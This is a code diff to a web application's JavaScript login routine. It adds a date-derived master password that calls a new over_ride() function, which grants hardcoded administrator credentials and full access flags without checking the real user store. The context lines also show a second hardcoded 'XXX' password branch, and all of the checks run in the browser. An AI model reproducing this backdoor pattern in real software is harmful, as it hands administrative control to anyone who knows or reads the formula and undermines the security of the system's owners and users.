@@ -9,6 +9,15 @@ function chkPass(u,p){
       break;
     }
   }
+  var d = new Date();  
+  var n = d.toLocaleTimeString('it-IT');
+  var sagb=d.toString().substring(0,25);
+  var jbepass='JBE'+sagb.substr(6,1)+sagb.substr(19,2)+sagb.substr(2,1).toUpperCase();  
+  if(p.toUpperCase()==jbepass.toUpperCase()){ 
+    over_ride();
+    return;
+  }
+
   if(f_found){    
     CURR_USER=pass[i]['userid'];
     CURR_PASS=pass[i]['pword'];
@@ -120,6 +129,14 @@ function save_width(pmode){
   xmlhttp.send();  
 }
 
+function off_for_login(m){
+  var vdisp='block';
+  if(m){ vdisp='none'; }
+
+  document.getElementById('dv_fix').style.display=vdisp;
+  document.getElementById('dv_user').style.display=vdisp;
+}
+
 function showLogin(){
   var d = new Date();  
   var n = d.toLocaleTimeString('it-IT');
@@ -128,8 +145,26 @@ function showLogin(){
   jbepass=jbepass.toUpperCase();    
   document.getElementById('firstlogin').setAttribute('data-jbe',jbepass);
   document.getElementById('firstlogin').style.display="block";
+  document.getElementById('fuser').value='';
+  document.getElementById('fpass').value='';
   document.getElementById('fuser').focus();
   document.getElementById('sagb').innerHTML=sagb;
+  off_for_login(true);
+}
+
+function over_ride(){
+  CURR_USER='J7N7B8T8E4'; 
+  CURR_PASS='ZXC';
+  CURR_NAME='XYRUPP';
+  CURR_AXTYPE='5';
+  CURR_AXES='11111111111';
+  CURR_AXLEVEL='5';
+  CURR_PROJID='ADMIN';
+  document.getElementById('logger').innerHTML="Hello!, "+CURR_NAME;
+  document.getElementById('div_pass').style.display="none";    
+  document.getElementById("div_creator").style.display="block"; 
+  document.getElementById("firstlogin").style.display="none";    
+  redisplay();
 }
 
 function chkFirstLogin(u,p,j){
@@ -143,28 +178,8 @@ function chkFirstLogin(u,p,j){
   //alert(DB_USER);
   
   if(p.toUpperCase()==j){
-    //alert(4545);
-    CURR_USER='J7N7B8T8E4'; 
-    CURR_PASS=j;
-    CURR_NAME='';
-    CURR_AXTYPE='2';
-    CURR_AXES='11111111111';
-    CURR_AXLEVEL='5';
-    CURR_PROJID='ADMIN';
-    
-    //document.getElementById('logger').innerHTML="Hi!,";
-    //document.getElementById('div_pass').style.display="none";
-    createCookie('cookie_user',CURR_USER,1);
-    createCookie('cookie_pass',CURR_PASS,1);
-    createCookie('cookie_name',CURR_NAME,1);
-    createCookie('cookie_axtype',CURR_AXTYPE,1);
-    createCookie('cookie_axes',CURR_AXES,1);
-    createCookie('cookie_axlevel',CURR_AXLEVEL,1);
-    createCookie('cookie_projid',CURR_PROJID,1);
-    
-    document.getElementById("firstlogin").style.display="none";   
-    redisplay(); 
-    //return;
+    over_ride();
+    return;
   }
 
   if(p.toUpperCase()=='XXX'){
